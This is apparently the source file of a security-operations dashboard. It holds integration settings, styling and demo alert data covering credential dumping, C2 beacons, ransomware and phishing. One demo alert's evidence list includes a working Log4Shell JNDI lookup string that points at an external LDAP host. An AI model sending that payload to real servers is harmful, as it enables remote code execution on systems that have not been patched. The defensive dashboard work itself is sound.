'use client';
import AlertsTab from './AlertsTab';
import WtMarkdown from './WtMarkdown';
import React, { useState, useEffect } from 'react';
import MSSPPortfolio from './MSSPPortfolio';
import ToolsTab from './ToolsTab';
import SalesDashboard from './SalesDashboard';
import AdminPortal from './AdminPortal';

// ─── Types ────────────────────────────────────────────────────────────────────

// ─── Constants ────────────────────────────────────────────────────────────────
const ALL_TOOLS = [
  {id:'crowdstrike',name:'CrowdStrike Falcon',category:'EDR',desc:'Endpoint detection & response'},
  {id:'defender',name:'Microsoft Defender',category:'EDR',desc:'Defender for Endpoint — Azure AD app required'},
  {id:'sentinelone',name:'SentinelOne',category:'EDR',desc:'AI-powered endpoint protection'},
  {id:'carbonblack',name:'Carbon Black',category:'EDR',desc:'Carbon Black Cloud'},
  {id:'splunk',name:'Splunk SIEM',category:'SIEM',desc:'Splunk Enterprise Security or Cloud'},
  {id:'sentinel',name:'Microsoft Sentinel',category:'SIEM',desc:'Cloud-native SIEM — Azure AD app required'},
  {id:'qradar',name:'IBM QRadar',category:'SIEM',desc:'Security intelligence platform'},
  {id:'elastic',name:'Elastic Security',category:'SIEM',desc:'SIEM built on Elastic Stack'},
  {id:'darktrace',name:'Darktrace',category:'NDR',desc:'AI network anomaly detection — HMAC auth'},
  {id:'taegis',name:'Secureworks Taegis',category:'XDR',desc:'Extended detection & response'},
  {id:'tenable',name:'Tenable.io',category:'Vuln',desc:'Cloud vulnerability management'},
  {id:'nessus',name:'Nessus',category:'Vuln',desc:'On-premise vulnerability scanner'},
  {id:'qualys',name:'Qualys',category:'Vuln',desc:'Cloud-based vulnerability management'},
  {id:'wiz',name:'Wiz',category:'CSPM',desc:'Cloud security posture management'},
  {id:'proofpoint',name:'Proofpoint',category:'Email',desc:'Email security & threat protection'},
  {id:'mimecast',name:'Mimecast',category:'Email',desc:'Email security platform'},
  {id:'zscaler',name:'Zscaler',category:'Network',desc:'Zero trust network access'},
  {id:'okta',name:'Okta',category:'Identity',desc:'Identity & access management'},
];


const DASHBOARD_CSS = '*{margin:0;padding:0;box-sizing:border-box}\n        html,body{max-width:100vw;overflow-x:hidden}\n        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}\n        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}\n\n        /* ── Dark theme (default) ── */\n        .wt-root {\n          --wt-bg: #090d18;\n          --wt-sidebar: #0c1122;\n          --wt-card: #0f1526;\n          --wt-card2: #131929;\n          --wt-border: #1d2535;\n          --wt-border2: #263044;\n          --wt-text: #e8ecf4;\n          --wt-muted: #7a8aa4;\n          --wt-secondary: #96a6bc;\n          --wt-dim: #4a5568;\n        }\n        /* ── Light theme ── */\n        .wt-root.light {\n          --wt-bg: #f5f6fa;\n          --wt-sidebar: #ffffff;\n          --wt-card: #ffffff;\n          --wt-card2: #f0f2f8;\n          --wt-border: #e2e5ef;\n          --wt-border2: #c8cedd;\n          --wt-text: #0f1117;\n          --wt-muted: #5a6580;\n          --wt-secondary: #4a5568;\n          --wt-dim: #8090a8;\n        }\n\n        .tab-btn{padding:7px 16px;border:none;background:transparent;cursor:pointer;font-size:0.76rem;font-weight:600;font-family:Inter,sans-serif;border-radius:8px;transition:all .15s;white-space:nowrap;color:var(--wt-muted)}\n        .tab-btn.active{background:#4f8fff18;color:#4f8fff}\n        .tab-btn:not(.active) {color:var(--wt-secondary);background:var(--wt-card2)}\n        .row-hover{transition:background .12s}\n        .row-hover:hover{background:var(--wt-card2)!important}\n        .vuln-row:hover{background:var(--wt-card2)!important;cursor:pointer}\n        .alert-card{border-radius:10px;border:1px solid var(--wt-border);background:var(--wt-card);transition:border-color .15s}\n        .alert-card:hover{border-color:#4f8fff28}\n        .skeleton{background:linear-gradient(90deg,var(--wt-card) 25%,var(--wt-card2) 50%,var(--wt-card) 75%);background-size:200% 100%;animation:skeleton-shimmer 1.4s ease infinite}\n        @keyframes skeleton-shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}\n        .wt-tab-content{animation:tab-fade 0.15s ease}\n        @keyframes tab-fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}\n        /* Focus-visible for keyboard accessibility */\n        :focus-visible{outline:2px solid #4f8fff !important;outline-offset:2px !important;border-radius:3px}\n        button:focus:not(:focus-visible),a:focus:not(:focus-visible){outline:none}\n        @media(max-width:500px){.wt-hide-xs{display:none!important}}\n\n        /* ── Mobile layout ── */\n        .wt-sidebar-desktop{display:none}\n        .wt-bottom-nav{display:none}\n        .wt-topbar-controls-full{display:flex}\n        .wt-topbar-controls-mobile{display:none}\n\n'
  + '@media(max-width:640px){\n          /* ── Bottom navigation ── */\n          .wt-bottom-nav{\n            display:flex!important;position:fixed;bottom:0;left:0;right:0;z-index:200;\n            background:var(--wt-sidebar);border-top:1px solid var(--wt-border2);\n            padding:4px 0 env(safe-area-inset-bottom,4px);\n            justify-content:space-around;align-items:stretch;\n          }\n          .wt-bottom-nav button,.wt-bottom-nav a{\n            display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;\n            background:none;border:none;cursor:pointer;color:var(--wt-muted);\n            font-size:0.62rem;font-weight:600;font-family:Inter,sans-serif;\n            padding:5px 4px 3px;border-radius:0;text-decoration:none;flex:1;min-width:0;\n            border-top:2px solid transparent;transition:color .12s,border-color .12s;\n          }\n          .wt-bottom-nav button.active{color:#4f8fff;border-top-color:#4f8fff;background:#4f8fff06}\n          .wt-bottom-nav a.active{color:#4f8fff;border-top-color:#4f8fff;background:#4f8fff06}\n          .wt-bottom-nav .bnav-icon{font-size:1.25rem;line-height:1;display:block}\n          /* ── Top bar ── */\n          .wt-tabbar{display:none!important}\n          .wt-topbar{padding:0 12px!important;height:44px!important}\n          .wt-topbar-controls-full{display:none!important}\n          .wt-topbar-controls-mobile{display:flex!important;gap:6px;align-items:center;margin-left:auto}\n          /* ── Content area ── */\n          .wt-content{padding:10px!important;padding-bottom:76px!important}\n          .wt-main{padding-bottom:0!important}\n          /* ── Grid breakdowns ── */\n          .wt-five-col{grid-template-columns:1fr 1fr!important}\n          .wt-four-col{grid-template-columns:1fr 1fr!important}\n          .wt-three-col{grid-template-columns:1fr!important}\n          .wt-two-col{grid-template-columns:1fr!important}\n          .wt-stat-grid{grid-template-columns:1fr 1fr!important}\n          /* ── Filters ── */\n          .wt-filter-row{flex-direction:column!important;gap:6px!important}\n          .wt-filter-row select,.wt-filter-row input,.wt-filter-row button{width:100%!important;box-sizing:border-box!important}\n          /* ── Bulk bar ── */\n          .wt-bulk-bar{flex-wrap:wrap!important;gap:6px!important}\n          /* ── Alert cards ── */\n          .alert-card{border-radius:8px}\n          /* ── Co-Pilot panel ── */\n          .wt-copilot{max-width:100%!important;width:100%!important;left:0!important;right:0!important;bottom:64px!important;border-radius:16px 16px 0 0!important}\n        }\n        @media(min-width:641px) and (max-width:900px){\n          .wt-content{padding:12px 14px!important}\n          .wt-five-col{grid-template-columns:repeat(3,1fr)!important}\n          .wt-four-col{grid-template-columns:1fr 1fr!important}\n          .wt-three-col{grid-template-columns:1fr 1fr!important}\n        }';

const CRED_FIELDS = {
  crowdstrike:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'base_url',label:'Base URL (optional)',placeholder:'https://api.crowdstrike.com'}],
  defender:[{key:'tenant_id',label:'Tenant ID',placeholder:'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'},{key:'client_id',label:'Application (Client) ID'},{key:'client_secret',label:'Client Secret',secret:true}],
  sentinelone:[{key:'host',label:'Management URL',placeholder:'https://your-tenant.sentinelone.net'},{key:'api_token',label:'API Token',secret:true}],
  carbonblack:[{key:'host',label:'CB Cloud URL',placeholder:'https://defense.conferdeploy.net'},{key:'org_key',label:'Org Key'},{key:'api_id',label:'API ID'},{key:'api_secret',label:'API Secret Key',secret:true}],
  splunk:[{key:'host',label:'Splunk Host',placeholder:'https://splunk.company.com:8089'},{key:'token',label:'API Token',secret:true}],
  sentinel:[{key:'tenant_id',label:'Tenant ID'},{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'subscription_id',label:'Subscription ID'},{key:'resource_group',label:'Resource Group'},{key:'workspace',label:'Workspace Name'}],
  qradar:[{key:'host',label:'QRadar Host',placeholder:'https://qradar.company.com'},{key:'sec_token',label:'SEC Token',secret:true}],
  elastic:[{key:'host',label:'Kibana URL',placeholder:'https://kibana.company.com'},{key:'api_key',label:'API Key',secret:true},{key:'space',label:'Space ID (optional)',placeholder:'default'}],
  darktrace:[{key:'host',label:'Darktrace Hostname',placeholder:'https://darktrace.company.com'},{key:'public_key',label:'Public Token'},{key:'private_key',label:'Private Token',secret:true}],
  taegis:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'region',label:'Region',placeholder:'us1'}],
  tenable:[{key:'access_key',label:'Access Key'},{key:'secret_key',label:'Secret Key',secret:true}],
  nessus:[{key:'host',label:'Nessus Host',placeholder:'https://nessus.company.com:8834'},{key:'access_key',label:'Access Key'},{key:'secret_key',label:'Secret Key',secret:true}],
  qualys:[{key:'platform',label:'Platform URL',placeholder:'https://qualysapi.qualys.com'},{key:'username',label:'Username'},{key:'password',label:'Password',secret:true}],
  wiz:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'api_endpoint',label:'API Endpoint',placeholder:'https://api.eu1.app.wiz.io/graphql'}],
  proofpoint:[{key:'principal',label:'Service Principal'},{key:'secret',label:'Secret',secret:true}],
  mimecast:[{key:'base_url',label:'Base URL',placeholder:'https://eu-api.mimecast.com'},{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true}],
  zscaler:[{key:'cloud',label:'Cloud URL',placeholder:'https://zsapi.zscaler.net'},{key:'username',label:'Username'},{key:'password',label:'Password',secret:true},{key:'api_key',label:'API Key',secret:true}],
  okta:[{key:'domain',label:'Okta Domain',placeholder:'https://company.okta.com'},{key:'api_token',label:'API Token',secret:true}],
};

const CATEGORIES = ['All','EDR','SIEM','NDR','XDR','Vuln','CSPM','Email','Network','Identity'];

const SEV_COLOR = { Critical:'#f0405e', High:'#f97316', Medium:'#f0a030', Low:'#4f8fff' };
const POSTURE_TREND = [61,65,68,71,70,73,74]; // 7-day history


const VERDICT_STYLE = {
  TP:{c:'#f0405e',bg:'#f0405e12',label:'True Positive'},
  FP:{c:'#22d49a',bg:'#22d49a12',label:'False Positive'},
  SUS:{c:'#f0a030',bg:'#f0a03012',label:'Suspicious'},
  Pending:{c:'#6b7a94',bg:'#6b7a9412',label:'Pending'},
};

const INDUSTRIES = ['Financial Services','Healthcare','Retail & eCommerce','Manufacturing','Energy & Utilities','Government & Public Sector','Legal & Professional','Technology','Education','Telecommunications'];

// ─── Demo Data ─────────────────────────────────────────────────────────────────

const DEMO_TOOLS = [
  // EDR
  {id:'crowdstrike',name:'CrowdStrike Falcon',configured:true,active:true,alertCount:8,category:'EDR'},
  {id:'defender',name:'Microsoft Defender',configured:true,active:true,alertCount:5,category:'EDR'},
  {id:'sentinelone',name:'SentinelOne',configured:true,active:true,alertCount:3,category:'EDR'},
  {id:'sophos',name:'Sophos Intercept X',configured:false,active:false,category:'EDR'},
  // SIEM
  {id:'splunk',name:'Splunk SIEM',configured:true,active:true,alertCount:12,category:'SIEM'},
  {id:'sentinel',name:'Microsoft Sentinel',configured:true,active:true,alertCount:4,category:'SIEM'},
  {id:'elastic',name:'Elastic Security',configured:false,active:false,category:'SIEM'},
  {id:'qradar',name:'IBM QRadar',configured:false,active:false,category:'SIEM'},
  // XDR/NDR
  {id:'taegis',name:'Secureworks Taegis',configured:false,active:false,category:'XDR'},
  {id:'cortex',name:'Palo Alto Cortex XDR',configured:false,active:false,category:'XDR'},
  {id:'darktrace',name:'Darktrace',configured:true,active:true,alertCount:3,category:'NDR'},
  {id:'vectra',name:'Vectra AI',configured:false,active:false,category:'NDR'},
  // Cloud
  {id:'aws_security_hub',name:'AWS Security Hub',configured:false,active:false,category:'Cloud'},
  {id:'azure_defender',name:'Defender for Cloud',configured:false,active:false,category:'Cloud'},
  {id:'gcp_scc',name:'GCP Security Cmd',configured:false,active:false,category:'Cloud'},
  // Identity
  {id:'okta',name:'Okta',configured:true,active:true,alertCount:2,category:'Identity'},
  {id:'entra',name:'Microsoft Entra ID',configured:false,active:false,category:'Identity'},
  {id:'duo',name:'Cisco Duo',configured:false,active:false,category:'Identity'},
  // Vuln
  {id:'tenable',name:'Tenable.io',configured:true,active:true,category:'Vuln'},
  {id:'qualys',name:'Qualys',configured:false,active:false,category:'Vuln'},
  {id:'wiz',name:'Wiz',configured:false,active:false,category:'CSPM'},
  // Email
  {id:'proofpoint',name:'Proofpoint',configured:true,active:true,alertCount:2,category:'Email'},
  {id:'abnormal',name:'Abnormal Security',configured:false,active:false,category:'Email'},
  {id:'m365_defender',name:'M365 Defender',configured:false,active:false,category:'Email'},
  // ITSM / SOAR
  {id:'servicenow',name:'ServiceNow',configured:false,active:false,category:'ITSM'},
  {id:'pagerduty',name:'PagerDuty',configured:false,active:false,category:'ITSM'},
  {id:'jira',name:'Jira',configured:false,active:false,category:'ITSM'},
  // ThreatIntel
  {id:'virustotal',name:'VirusTotal',configured:false,active:false,category:'ThreatIntel'},
  {id:'recorded_future',name:'Recorded Future',configured:false,active:false,category:'ThreatIntel'},
  // Network/Firewall
  {id:'zscaler',name:'Zscaler',configured:true,active:true,alertCount:1,category:'Network'},
  {id:'fortigate',name:'FortiGate',configured:false,active:false,category:'Firewall'},
  // OT/ICS
  {id:'claroty',name:'Claroty',configured:false,active:false,category:'OT/ICS'},
  {id:'nozomi',name:'Nozomi Networks',configured:false,active:false,category:'OT/ICS'},
  // MSP
  {id:'huntress',name:'Huntress MDR',configured:false,active:false,category:'MSP'},
  {id:'connectwise',name:'ConnectWise PSA',configured:false,active:false,category:'MSP'},
  // Comms
  {id:'slack',name:'Slack',configured:false,active:false,category:'Comms'},
  {id:'teams',name:'Microsoft Teams',configured:false,active:false,category:'Comms'},
];

const DEMO_GAP_DEVICES = [
  {hostname:'SRV-LEGACY01',ip:'10.0.4.22',os:'Windows Server 2008',missing:['CrowdStrike Falcon','Tenable.io'],reason:'Legacy OS — agent incompatible',lastSeen:'2h ago',lastSeenDays:9},
  {hostname:'laptop-MKTG07',ip:'10.0.2.87',os:'Windows 11',missing:['CrowdStrike Falcon'],reason:'User-initiated uninstall',lastSeen:'15m ago',lastSeenDays:0},
  {hostname:'SRV-NAS01',ip:'10.0.3.15',os:'FreeNAS',missing:['CrowdStrike Falcon','Tenable.io','Splunk SIEM'],reason:'NAS device — no agent support',lastSeen:'5m ago',lastSeenDays:0},
  {hostname:'KIOSK-LOBBY',ip:'10.0.1.200',os:'Windows 10 IoT',missing:['Tenable.io','Microsoft Defender'],reason:'IoT device — restricted access',lastSeen:'1m ago',lastSeenDays:5},
  {hostname:'laptop-HR03',ip:'10.0.2.44',os:'macOS 13',missing:['CrowdStrike Falcon'],reason:'Pending deployment — ticket open',lastSeen:'30m ago',lastSeenDays:2},
];

const DEMO_ALERTS = [
  {id:'a1',title:'LSASS memory access — DC01',severity:'Critical',source:'CrowdStrike',device:'DC01',user:'admin_svc',ip:'10.0.0.5',time:'09:14',verdict:'TP',confidence:98,aiReasoning:'Domain controller targeted by LSASS memory access. Service account credentials at high risk. T1003.001 — high-fidelity detection. No maintenance window active. Previous login from this account was legitimate, now accessing LSASS — strong indicator of credential dumping.',evidenceChain:['Domain controller targeted — highest value asset','Service account admin_svc used laterally across 3 hosts','T1003.001 — credential dumping technique, high-fidelity','No scheduled maintenance or admin activity logged','Sequence mirrors known Mimikatz behaviour'],aiActions:['Incident INC-0847 created and assigned to Tier 2','admin_svc account disabled (revert available)','SOC Slack #incidents channel notified','5-step runbook generated and attached'],runbookSteps:['Isolate DC01 from network immediately','Reset admin_svc credentials across all domains','Run forensic memory capture on DC01','Search SIEM for admin_svc lateral movement in last 48h','Notify CISO — potential domain compromise'],mitre:'T1003.001',incidentId:'INC-0847'},
  {id:'a2',title:'C2 beacon to 185.220.101.42:443',severity:'High',source:'Darktrace',device:'SRV-FINANCE01',ip:'185.220.101.42',time:'09:16',verdict:'TP',confidence:94,aiReasoning:'Darktrace detected anomalous HTTPS beacon with JA3 fingerprint matching known C2. IP 185.220.101.42 appears on ThreatFox with LockBit association. Beaconing interval 300s — consistent with C2 heartbeat.',evidenceChain:['IP on ThreatFox — LockBit C2','Darktrace: device deviation 96/100','JA3 fingerprint matches C2 tooling','300s beacon — classic heartbeat','Seen in sector intel 48h ago'],aiActions:['IP blocked at Zscaler perimeter','Darktrace packet capture initiated','IOC added to watchlist','SRV-FINANCE01 access restricted'],runbookSteps:['Block IP at all perimeter controls','Analyse all traffic from SRV-FINANCE01 last 72h','Check for additional beaconing hosts','Preserve memory image before isolation','Report IOC to ISG'],mitre:'T1071.001'},
  {id:'a3',title:'Scheduled task persistence — SRV-APP02',severity:'Medium',source:'Defender',device:'SRV-APP02',time:'09:22',verdict:'SUS',confidence:67,aiReasoning:'Scheduled task created outside business hours by non-standard account. Technique consistent with persistence but could be legitimate tooling. Moderate confidence — analyst review recommended.',evidenceChain:['Task created at 02:17 AM — outside business hours','Non-standard service account creator','No matching change ticket','Similar to APT29 technique','No other anomalous activity from account'],aiActions:['Alert flagged for analyst review','Task hash added to monitoring'],runbookSteps:['Review task definition and binary','Cross-reference with change management','Check account login history','If unconfirmed — isolate and investigate'],mitre:'T1053.005'},
  {id:'a4',title:'PowerShell via Windows Update',severity:'Low',source:'Splunk',device:'WS-SALES12',time:'09:31',verdict:'FP',confidence:99,aiReasoning:'PowerShell traced to Windows Update process (wuauclt.exe). Microsoft-signed certificate. KB5034441 scheduled. No malicious indicators.',evidenceChain:['Parent: wuauclt.exe — legit Windows Update','Microsoft-signed certificate','KB5034441 scheduled at 09:30','No network egress','No payload or download cradle'],aiActions:['Auto-closed — FP 99% confidence','Suppression rule created'],runbookSteps:[],mitre:'T1059.001'},
  {id:'a5',title:'Anomalous VPN login — new geography',severity:'Medium',source:'Sentinel',device:'cloud-vpn',user:'jsmith@corp',time:'09:38',verdict:'SUS',confidence:72,aiReasoning:'User jsmith logged in from Singapore — baseline is UK. 03:00 AM local time. No travel in calendar. MFA enabled but not challenged.',evidenceChain:['Baseline: London — current: Singapore','03:00 AM local time','No calendar travel entry','MFA not recently challenged','No prior Singapore login in 12 months'],aiActions:['MFA re-challenge sent','Session maintained pending response','24h enhanced monitoring applied'],runbookSteps:['Await MFA — escalate if no response in 10m','If passed — monitor for anomalies','If failed — suspend account immediately','Contact user via phone'],mitre:'T1078'},
  {id:'a6',title:'Large data exfiltration to personal cloud',severity:'High',source:'Zscaler',device:'laptop-HR03',user:'lbrown@corp',ip:'142.250.80.46',time:'10:02',verdict:'TP',confidence:88,aiReasoning:'18GB uploaded to personal Google Drive over 2 hours — 36x daily baseline. User has active resignation notice. Files include payroll directories. DLP policy triggered.',evidenceChain:['18GB — 36x user baseline','Personal Google Drive destination','Active resignation notice on file','Files: /finance/payroll/2025','DLP: PII and financial data'],aiActions:['Upload throttled via Zscaler','HR and Legal alerted','Files logged to audit trail','DLP monitoring enhanced'],runbookSteps:['Legal review of AUP breach','Preserve DLP logs','Remote wipe on departure','Brief IT on offboarding'],mitre:'T1567.002'},
  {id:'a7',title:'Ransomware IOC match — SRV-BACKUP01',severity:'Critical',source:'Taegis XDR',device:'SRV-BACKUP01',ip:'10.0.4.12',time:'10:15',verdict:'TP',confidence:96,aiReasoning:'Taegis detected file extension mass-rename (.wncry extension) combined with shadow copy deletion commands. Backup server targeted — highest priority. Pattern matches LockBit 3.0 TTPs.',evidenceChain:['Mass file rename to .wncry extension','vssadmin delete shadows executed','Backup server — critical asset','LockBit 3.0 TTP match','Lateral movement from SRV-FINANCE01 same IP range'],aiActions:['SRV-BACKUP01 isolated immediately','Incident INC-0851 created — P1','CISO and IR team notified','Forensic snapshot taken'],runbookSteps:['Isolate entire VLAN 10.0.4.0/24','Identify patient zero — check finance server','Restore from known-good offline backup','Do not pay ransom — contact IR retainer','Notify ICO within 72h if PII affected'],mitre:'T1486',incidentId:'INC-0851'},
  {id:'a8',title:'Malicious email attachment opened — Phishing',severity:'High',source:'Proofpoint',device:'WS-ACCTS04',user:'mwilson@corp',time:'10:28',verdict:'TP',confidence:91,aiReasoning:'Proofpoint quarantined email with malicious macro-enabled Excel attachment. User override-opened the quarantined attachment. DMARC fail + spoofed CFO sender. Attachment hash matches known dropper.',evidenceChain:['User override-opened quarantined attachment','DMARC fail on sender domain','Spoofed CFO: cfo@company-corp.com vs company.com','Attachment hash in VirusTotal 47/72','Macro-enabled XLSM — known dropper'],aiActions:['Attachment quarantined','User endpoint EDR scan triggered','Email chain blocked','Security awareness alert sent to team'],runbookSteps:['Isolate WS-ACCTS04 immediately','Reset mwilson credentials','Check for any macro execution logs','Hunt for dropper IOCs across estate','Phishing simulation recommendation'],mitre:'T1566.001'},
  {id:'a9',title:'Suspicious OAuth app consent — Admin tenant',severity:'High',source:'Okta',device:'cloud-identity',user:'adminfirst@corp',time:'10:44',verdict:'SUS',confidence:79,aiReasoning:'New OAuth application granted admin-level directory permissions without change review. App publisher unverified. Consent granted by an admin account with no prior app authorisation history — potential OAuth phishing (consent grant attack).',evidenceChain:['OAuth app granted Directory.ReadWrite.All','Publisher domain: unverified','Granted by account with no prior app approvals','No change ticket for this application','Similar TTPs to Midnight Blizzard'],aiActions:['App access suspended pending review','Admin account placed on watchlist','Conditional access policy tightened'],runbookSteps:['Revoke application consent immediately','Audit all data accessed by app in last 24h','Review admin account login history','Enforce admin consent workflow in Azure AD','Hunt for similar OAuth apps across tenant'],mitre:'T1528'},
  {id:'a10',title:'Critical vulnerability exploitation attempt — Log4Shell',severity:'Critical',source:'Elastic',device:'SRV-WEB02',ip:'45.33.32.156',time:'11:02',verdict:'TP',confidence:97,aiReasoning:'Elastic SIEM detected Log4Shell (CVE-2021-44228) exploitation string in HTTP User-Agent header targeting SRV-WEB02 Java application. Source IP on Shodan as known exploit scanner. Payload attempting JNDI LDAP callback to attacker-controlled server.',evidenceChain:['Log4Shell JNDI payload in User-Agent: ${jndi:ldap://45.33.32.156/a}','Source IP flagged on Shodan as exploit scanner','Java application on SRV-WEB02 uses Log4j 2.14.0 (vulnerable)','LDAP callback attempt to external IP detected','Pattern matches automated exploit kit'],aiActions:['WAF rule deployed — payload blocked','SRV-WEB02 Log4j emergency patch queued','Source IP blocked at perimeter','Incident INC-0852 created'],runbookSteps:['Emergency patch Log4j to 2.17.1+','Check for successful JNDI callbacks in last 72h','Audit all internet-facing Java apps','Deploy WAF rule across all load balancers','Threat hunt for post-exploitation'],mitre:'T1190',incidentId:'INC-0852'},
  {id:'a11',title:'Endpoint EDR detection — Cobalt Strike beacon',severity:'Critical',source:'SentinelOne',device:'WS-DEV08',user:'rchang@corp',ip:'192.168.1.88',time:'11:19',verdict:'TP',confidence:95,aiReasoning:'SentinelOne AI detected in-memory Cobalt Strike beacon activity on developer workstation. Process injection into legitimate svchost.exe. Beacon profile matches known CS team server. Developer workstation with elevated privileges — high lateral movement risk.',evidenceChain:['Cobalt Strike process injection: malware→svchost.exe','In-memory beacon — no disk artefact (fileless)','CS team server profile match','Developer account has domain admin','Outbound C2 to new domain registered 3 days ago'],aiActions:['WS-DEV08 isolated immediately','Process killed and memory dump taken','rchang credentials reset','Incident INC-0853 P1 created'],runbookSteps:['Immediate network isolation of WS-DEV08','Full memory forensics via SentinelOne Deep Visibility','Hunt for lateral movement from rchang account','Reset all privileged credentials accessible from this host','Check CI/CD pipeline for injected code'],mitre:'T1055.002',incidentId:'INC-0853'},
  {id:'a12',title:'Carbon Black — PowerShell Empire C2 detected',severity:'High',source:'Carbon Black',device:'SRV-HR01',ip:'10.0.2.31',time:'11:33',verdict:'TP',confidence:89,aiReasoning:'Carbon Black Response detected Empire PowerShell C2 framework. Encrypted HTTP traffic to non-corporate IP. Staging behaviour consistent with post-exploitation recon phase. HR server — PII data at risk.',evidenceChain:['Empire PowerShell C2 signature match','Encrypted HTTP to non-corporate IP: 92.63.197.44','AMSI bypass attempted','HR server — contains employee PII','Process chain: outlook.exe → powershell.exe → network'],aiActions:['Host isolated via Carbon Black Response','Kill switch deployed on CB agent','HR data access logged for DPA purposes','NCSC reported — GDPR breach assessment started'],runbookSteps:['Isolate SRV-HR01','Identify initial access vector — suspect phishing email','Preserve logs for ICO potential notification','Hunt for Empire agents across estate','Engage DPO for GDPR 72h assessment'],mitre:'T1059.001'},
  {id:'a13',title:'Vulnerability scan — Critical CVE on exposed service',severity:'High',source:'Tenable',device:'SRV-EXTERNAL01',ip:'203.0.113.42',time:'11:45',verdict:'TP',confidence:92,aiReasoning:'Tenable.io identifies CVE-2024-1709 (ConnectWise ScreenConnect auth bypass, CVSS 10.0) on internet-facing server. CISA KEV listed. Active exploitation in the wild. Immediate patching required.',evidenceChain:['CVE-2024-1709 CVSS 10.0 — CISA KEV listed','Internet-facing host with no WAF in front','Plugin ID 212918 — auth bypass confirmed','Exploit PoC publicly available','Active exploitation confirmed by CISA'],aiActions:['Critical vuln ticket raised — P1 SLA 24h','Firewall rule applied to restrict access','Patch notification sent to ops team'],runbookSteps:['Apply patch immediately — CVE-2024-1709','If patch not possible: block external access','Verify no exploitation occurred in last 14 days','Deploy WAF rule as compensating control','Rescan after patch to verify remediation'],mitre:'T1190'},
  {id:'a15',title:'AWS GuardDuty — Unusual IAM activity',severity:'High',source:'AWS Security Hub',device:'iam-role-prod',user:'svc-deploy@company.com',ip:'54.220.101.15',time:'11:55',verdict:'SUS',confidence:78,aiReasoning:'AWS Security Hub ingested GuardDuty finding: IAM role assuming unusual cross-account permissions outside business hours. Source IP not in expected CIDR range for CI/CD pipeline.',evidenceChain:['IAM role: arn:aws:iam::prod-account — cross-account assume','Outside business hours: 03:22 UTC','Source IP 54.220.101.15 not in known CI/CD CIDR','GuardDuty: UnauthorizedAccess:IAMUser/AnomalousBehavior','No matching deployment pipeline activity'],aiActions:['IAM session suspended','AWS Config rule triggered — non-compliant resource flagged','Incident INC-0854 created'],runbookSteps:['Revoke IAM session token immediately','Check CloudTrail for all actions taken by this role in last 2h','Review cross-account trust relationships','Rotate access keys for svc-deploy service account','Enable IAM Access Analyzer if not active'],mitre:'T1078.004'},
  {id:'a16',title:'Sophos Intercept X — RansomSafe triggered',severity:'Critical',source:'Sophos',device:'SRV-SHARES01',user:'lthomas@corp',ip:'10.0.5.33',time:'12:08',verdict:'TP',confidence:96,aiReasoning:'Sophos RansomSafe intercepted ransomware-like mass file modification. 847 files renamed in 4 seconds with new extension. CryptoGuard rollback initiated. Sophos Deep Learning detected novel ransomware variant not in signature database.',evidenceChain:['847 files modified in 4 seconds','CryptoGuard: mass encryption intercepted','Novel variant — Deep Learning detection','Share server: highest lateral movement risk','Process: svchost.exe (spoofed — invalid signature)'],aiActions:['SRV-SHARES01 isolated by Sophos','Files rolled back via CryptoGuard','Incident INC-0855 created — P1','CISO and IR team paged'],runbookSteps:['Verify CryptoGuard rollback success — check file hashes','Isolate entire VLAN from SRV-SHARES01','Identify patient zero via process tree','Hunt for matching process hash across estate','Notify ICO within 72h if PII affected'],mitre:'T1486',incidentId:'INC-0855'},
  {id:'a17',title:'Vectra AI — Privileged lateral movement detected',severity:'High',source:'Vectra AI',device:'WS-DEV03',ip:'10.0.3.41',time:'12:22',verdict:'SUS',confidence:82,aiReasoning:'Vectra AI Cognito detected privileged credential usage from a non-privileged workstation. Threat score 87/100. Device querying domain controller via LDAP at unusual frequency — potential account enumeration preceding lateral movement.',evidenceChain:['Privilege score: 87 — 94th percentile','LDAP queries to DC: 847 in 10min (baseline: 12)','Source: developer workstation — no admin rights','No matching maintenance activity','Similar to pre-breach enumeration pattern'],aiActions:['Vectra detection flagged for analyst review','Account placed on Vectra watchlist'],runbookSteps:['Review LDAP queries from WS-DEV03 in last 2h','Check user account login history across all hosts','If enumeration confirmed: isolate workstation','Hunt for Kerberoasting attempts from same host'],mitre:'T1087.002'},
  {id:'a14',title:'QRadar SIEM — Insider threat data staging',severity:'High',source:'QRadar',device:'WS-FIN22',user:'tpatel@corp',ip:'10.1.5.22',time:'12:01',verdict:'SUS',confidence:76,aiReasoning:'QRadar correlated multiple events: unusual after-hours file access, large archive creation, USB device insertion, and internal IP scanning. Pattern matches pre-exfiltration staging. User is on PIP — HR flag.',evidenceChain:['After-hours file access to /finance/budgets — 2am','7z archive created: company_data.7z (3.4GB)','USB device inserted 02:14','Internal IP scan from WS-FIN22 03:00','HR flag: user on performance improvement plan'],aiActions:['DLP alert raised','USB activity flagged for HR review','Account placed on enhanced monitoring','Legal briefed on potential IP theft'],runbookSteps:['Preserve forensic image of WS-FIN22','Brief HR and Legal before any user contact','Review DLP logs for data classification','Check USB device serial number against asset register','Prepare evidence chain for potential proceedings'],mitre:'T1074.001'},
]

const DEMO_VULNS = [
  {id:'v1',cve:'CVE-2024-21413',title:'Microsoft Outlook NTLM Credential Leak',severity:'Critical',cvss:9.8,prevalence:94,affected:23,affectedDevices:['laptop-CFO01','laptop-SALES03','WS-HR01','+ 20 more'],description:'Critical RCE/NTLM relay vulnerability in Microsoft Outlook. Exploitable via malicious email links without user interaction. Actively exploited in the wild by APT actors.',remediation:['Apply Microsoft patch KB5002112 immediately','Enable Windows Credential Guard on all endpoints','Block outbound SMB (TCP 445) at perimeter','Add to email gateway URL filtering rules','Consider blocking external hyperlinks in email until patched'],kev:true,patch:'KB5002112'},
